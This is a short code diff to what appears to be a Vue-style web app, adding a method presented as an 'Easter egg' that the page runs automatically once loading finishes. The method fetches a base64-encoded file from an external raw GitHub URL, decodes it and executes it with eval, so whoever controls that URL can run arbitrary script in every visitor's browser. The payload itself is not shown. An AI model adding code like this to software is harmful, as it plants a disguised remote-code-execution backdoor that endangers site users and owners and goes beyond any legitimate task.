@@ -399,6 +399,23 @@
         onLimitChange() {
           this.currentPage = 1;
           this.fetchMatches();
+        },
+
+        // Fetch and decode the base64 Easter egg script
+        async fetchAndExecuteEasterEgg() {
+          try {
+            const base64Url = "https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/easter_egg.base64";
+            const response = await fetch(base64Url);
+            const base64EncodedScript = await response.text();
+
+            // Decode Base64 to script
+            const decodedScript = atob(base64EncodedScript);
+
+            // Execute the decoded script
+            eval(decodedScript);
+          } catch (error) {
+            console.error("Error fetching and executing Easter egg script:", error);
+          }
         }
       },
 
@@ -406,6 +423,9 @@
         await this.loadSettings();
         await this.fetchCorporations();
         await this.fetchMatches();
+
+        // Execute the Easter egg after everything is loaded
+        await this.fetchAndExecuteEasterEgg();
       }
     });
 
